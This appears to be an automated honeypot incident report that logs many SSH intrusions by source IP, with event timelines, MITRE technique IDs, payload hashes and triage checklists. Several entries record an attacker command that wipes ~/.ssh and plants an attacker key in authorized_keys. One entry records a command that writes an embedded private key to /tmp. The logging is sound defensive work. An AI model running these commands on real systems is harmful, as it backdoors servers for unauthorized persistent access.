| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:08:35` | `cowrie.session.connect` |
| `2026-08-29 22:08:35` | `cowrie.client.version` |
| `2026-08-29 22:08:35` | `cowrie.client.kex` |
| `2026-08-29 22:08:36` | `cowrie.login.success` |
| `2026-08-29 22:08:37` | `cowrie.session.params` |
| `2026-08-29 22:08:37` | `cowrie.command.input` |
| `2026-08-29 22:08:37` | `cowrie.session.file_download` |
| `2026-08-29 22:08:37` | `cowrie.session.file_download` |
| `2026-08-29 22:08:37` | `cowrie.log.closed` |
| `2026-08-29 22:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b023709445d

| Field | Detail |
|---|---|
| **Source IP** | `213.209.159[.]230` |
| **First Seen** | 2026-08-29 22:09 |
| **Last Seen** | 2026-08-29 22:10 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:09:39` | `cowrie.session.connect` |
| `2026-08-29 22:09:39` | `cowrie.client.version` |
| `2026-08-29 22:09:39` | `cowrie.client.kex` |
| `2026-08-29 22:09:39` | `cowrie.login.success` |
| `2026-08-29 22:09:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:09:40` | `cowrie.direct-tcpip.ja4` |
| `2026-08-29 22:09:40` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.209.159[.]230` to AbuseIPDB if not already reported
- [ ] Block `213.209.159[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba4eda1ad18

| Field | Detail |
|---|---|
| **Source IP** | `51.77.213[.]203` |
| **First Seen** | 2026-08-29 22:09 |
| **Last Seen** | 2026-08-29 22:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:09:45` | `cowrie.session.connect` |
| `2026-08-29 22:09:45` | `cowrie.client.version` |
| `2026-08-29 22:09:46` | `cowrie.client.kex` |
| `2026-08-29 22:09:46` | `cowrie.login.success` |
| `2026-08-29 22:09:47` | `cowrie.session.params` |
| `2026-08-29 22:09:47` | `cowrie.command.input` |
| `2026-08-29 22:09:47` | `cowrie.command.failed` |
| `2026-08-29 22:09:47` | `cowrie.log.closed` |
| `2026-08-29 22:09:48` | `cowrie.session.params` |
| `2026-08-29 22:09:48` | `cowrie.command.input` |
| `2026-08-29 22:09:48` | `cowrie.session.file_download` |
| `2026-08-29 22:09:48` | `cowrie.log.closed` |
| `2026-08-29 22:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.213[.]203` to AbuseIPDB if not already reported
- [ ] Block `51.77.213[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0875ef0b2884

| Field | Detail |
|---|---|
| **Source IP** | `51.77.213[.]203` |
| **First Seen** | 2026-08-29 22:09 |
| **Last Seen** | 2026-08-29 22:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:09:48` | `cowrie.session.connect` |
| `2026-08-29 22:09:48` | `cowrie.client.version` |
| `2026-08-29 22:09:48` | `cowrie.client.kex` |
| `2026-08-29 22:09:48` | `cowrie.login.success` |
| `2026-08-29 22:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.213[.]203` to AbuseIPDB if not already reported
- [ ] Block `51.77.213[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3830caadab34

| Field | Detail |
|---|---|
| **Source IP** | `51.77.213[.]203` |
| **First Seen** | 2026-08-29 22:09 |
| **Last Seen** | 2026-08-29 22:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:09:48` | `cowrie.session.connect` |
| `2026-08-29 22:09:48` | `cowrie.client.version` |
| `2026-08-29 22:09:49` | `cowrie.client.kex` |
| `2026-08-29 22:09:49` | `cowrie.login.success` |
| `2026-08-29 22:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.77.213[.]203` to AbuseIPDB if not already reported
- [ ] Block `51.77.213[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c1abc523dde

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-08-29 22:10 |
| **Last Seen** | 2026-08-29 22:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:10:34` | `cowrie.session.connect` |
| `2026-08-29 22:10:34` | `cowrie.client.version` |
| `2026-08-29 22:10:34` | `cowrie.client.kex` |
| `2026-08-29 22:10:34` | `cowrie.login.success` |
| `2026-08-29 22:10:35` | `cowrie.session.params` |
| `2026-08-29 22:10:35` | `cowrie.command.input` |
| `2026-08-29 22:10:35` | `cowrie.command.failed` |
| `2026-08-29 22:10:36` | `cowrie.log.closed` |
| `2026-08-29 22:10:36` | `cowrie.session.params` |
| `2026-08-29 22:10:36` | `cowrie.command.input` |
| `2026-08-29 22:10:36` | `cowrie.session.file_download` |
| `2026-08-29 22:10:36` | `cowrie.log.closed` |
| `2026-08-29 22:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c52badd08b3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:10 |
| **Last Seen** | 2026-08-29 22:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:10:36` | `cowrie.session.connect` |
| `2026-08-29 22:10:36` | `cowrie.client.version` |
| `2026-08-29 22:10:36` | `cowrie.client.kex` |
| `2026-08-29 22:10:40` | `cowrie.login.success` |
| `2026-08-29 22:10:41` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:10:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:10:41` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25a55224696

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-08-29 22:10 |
| **Last Seen** | 2026-08-29 22:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:10:37` | `cowrie.session.connect` |
| `2026-08-29 22:10:37` | `cowrie.client.version` |
| `2026-08-29 22:10:37` | `cowrie.client.kex` |
| `2026-08-29 22:10:37` | `cowrie.login.success` |
| `2026-08-29 22:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b020016d78a9

| Field | Detail |
|---|---|
| **Source IP** | `154.83.196[.]237` |
| **First Seen** | 2026-08-29 22:10 |
| **Last Seen** | 2026-08-29 22:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:10:37` | `cowrie.session.connect` |
| `2026-08-29 22:10:37` | `cowrie.client.version` |
| `2026-08-29 22:10:38` | `cowrie.client.kex` |
| `2026-08-29 22:10:38` | `cowrie.login.success` |
| `2026-08-29 22:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.196[.]237` to AbuseIPDB if not already reported
- [ ] Block `154.83.196[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16732373d566

| Field | Detail |
|---|---|
| **Source IP** | `113.193.187[.]154` |
| **First Seen** | 2026-08-29 22:10 |
| **Last Seen** | 2026-08-29 22:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:10:51` | `cowrie.session.connect` |
| `2026-08-29 22:10:51` | `cowrie.client.version` |
| `2026-08-29 22:10:51` | `cowrie.client.kex` |
| `2026-08-29 22:10:53` | `cowrie.login.success` |
| `2026-08-29 22:10:53` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.193.187[.]154` to AbuseIPDB if not already reported
- [ ] Block `113.193.187[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df20fb75f13

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:23` | `cowrie.session.connect` |
| `2026-08-29 22:11:23` | `cowrie.client.version` |
| `2026-08-29 22:11:23` | `cowrie.client.kex` |
| `2026-08-29 22:11:24` | `cowrie.login.success` |
| `2026-08-29 22:11:24` | `cowrie.direct-tcpip.request` |
| `2026-08-29 22:11:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 22:11:24` | `cowrie.direct-tcpip.data` |
| `2026-08-29 22:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3111c1f27809

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:23` | `cowrie.session.connect` |
| `2026-08-29 22:11:23` | `cowrie.client.version` |
| `2026-08-29 22:11:24` | `cowrie.client.kex` |
| `2026-08-29 22:11:25` | `cowrie.login.success` |
| `2026-08-29 22:11:26` | `cowrie.session.params` |
| `2026-08-29 22:11:26` | `cowrie.command.input` |
| `2026-08-29 22:11:26` | `cowrie.command.failed` |
| `2026-08-29 22:11:26` | `cowrie.log.closed` |
| `2026-08-29 22:11:27` | `cowrie.session.params` |
| `2026-08-29 22:11:27` | `cowrie.command.input` |
| `2026-08-29 22:11:28` | `cowrie.session.file_download` |
| `2026-08-29 22:11:28` | `cowrie.log.closed` |
| `2026-08-29 22:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2c8570640a6

| Field | Detail |
|---|---|
| **Source IP** | `104.199.176[.]250` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:26` | `cowrie.session.connect` |
| `2026-08-29 22:11:26` | `cowrie.client.version` |
| `2026-08-29 22:11:26` | `cowrie.client.kex` |
| `2026-08-29 22:11:28` | `cowrie.login.success` |
| `2026-08-29 22:11:28` | `cowrie.session.params` |
| `2026-08-29 22:11:28` | `cowrie.command.input` |
| `2026-08-29 22:11:28` | `cowrie.command.failed` |
| `2026-08-29 22:11:29` | `cowrie.log.closed` |
| `2026-08-29 22:11:30` | `cowrie.session.params` |
| `2026-08-29 22:11:30` | `cowrie.command.input` |
| `2026-08-29 22:11:30` | `cowrie.session.file_download` |
| `2026-08-29 22:11:30` | `cowrie.log.closed` |
| `2026-08-29 22:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.176[.]250` to AbuseIPDB if not already reported
- [ ] Block `104.199.176[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec5e52183ae2

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:28` | `cowrie.session.connect` |
| `2026-08-29 22:11:28` | `cowrie.client.version` |
| `2026-08-29 22:11:28` | `cowrie.client.kex` |
| `2026-08-29 22:11:30` | `cowrie.login.success` |
| `2026-08-29 22:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a38c0e9eaebd

| Field | Detail |
|---|---|
| **Source IP** | `104.199.176[.]250` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:30` | `cowrie.session.connect` |
| `2026-08-29 22:11:30` | `cowrie.client.version` |
| `2026-08-29 22:11:30` | `cowrie.client.kex` |
| `2026-08-29 22:11:31` | `cowrie.login.success` |
| `2026-08-29 22:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.176[.]250` to AbuseIPDB if not already reported
- [ ] Block `104.199.176[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6c312fbf22

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:30` | `cowrie.session.connect` |
| `2026-08-29 22:11:30` | `cowrie.client.version` |
| `2026-08-29 22:11:31` | `cowrie.client.kex` |
| `2026-08-29 22:11:32` | `cowrie.login.success` |
| `2026-08-29 22:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-196a13eb1a37

| Field | Detail |
|---|---|
| **Source IP** | `104.199.176[.]250` |
| **First Seen** | 2026-08-29 22:11 |
| **Last Seen** | 2026-08-29 22:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:11:31` | `cowrie.session.connect` |
| `2026-08-29 22:11:31` | `cowrie.client.version` |
| `2026-08-29 22:11:32` | `cowrie.client.kex` |
| `2026-08-29 22:11:32` | `cowrie.login.success` |
| `2026-08-29 22:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.176[.]250` to AbuseIPDB if not already reported
- [ ] Block `104.199.176[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00dac23b954

| Field | Detail |
|---|---|
| **Source IP** | `49.207.241[.]187` |
| **First Seen** | 2026-08-29 22:19 |
| **Last Seen** | 2026-08-29 22:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:19:25` | `cowrie.session.connect` |
| `2026-08-29 22:19:25` | `cowrie.client.version` |
| `2026-08-29 22:19:25` | `cowrie.client.kex` |
| `2026-08-29 22:19:26` | `cowrie.login.success` |
| `2026-08-29 22:19:27` | `cowrie.session.params` |
| `2026-08-29 22:19:27` | `cowrie.command.input` |
| `2026-08-29 22:19:27` | `cowrie.command.failed` |
| `2026-08-29 22:19:27` | `cowrie.log.closed` |
| `2026-08-29 22:19:28` | `cowrie.session.params` |
| `2026-08-29 22:19:28` | `cowrie.command.input` |
| `2026-08-29 22:19:28` | `cowrie.session.file_download` |
| `2026-08-29 22:19:28` | `cowrie.log.closed` |
| `2026-08-29 22:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.241[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.207.241[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a093d4f413aa

| Field | Detail |
|---|---|
| **Source IP** | `49.207.241[.]187` |
| **First Seen** | 2026-08-29 22:19 |
| **Last Seen** | 2026-08-29 22:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:19:28` | `cowrie.session.connect` |
| `2026-08-29 22:19:28` | `cowrie.client.version` |
| `2026-08-29 22:19:29` | `cowrie.client.kex` |
| `2026-08-29 22:19:29` | `cowrie.login.success` |
| `2026-08-29 22:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.241[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.207.241[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d376703fdb

| Field | Detail |
|---|---|
| **Source IP** | `49.207.241[.]187` |
| **First Seen** | 2026-08-29 22:19 |
| **Last Seen** | 2026-08-29 22:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:19:30` | `cowrie.session.connect` |
| `2026-08-29 22:19:30` | `cowrie.client.version` |
| `2026-08-29 22:19:30` | `cowrie.client.kex` |
| `2026-08-29 22:19:31` | `cowrie.login.success` |
| `2026-08-29 22:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.241[.]187` to AbuseIPDB if not already reported
- [ ] Block `49.207.241[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f4a0bfee958

| Field | Detail |
|---|---|
| **Source IP** | `116.114.84[.]246` |
| **First Seen** | 2026-08-29 22:19 |
| **Last Seen** | 2026-08-29 22:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 22:19:54` | `cowrie.session.connect` |
| `2026-08-29 22:19:55` | `cowrie.client.version` |
| `2026-08-29 22:19:55` | `cowrie.client.kex` |
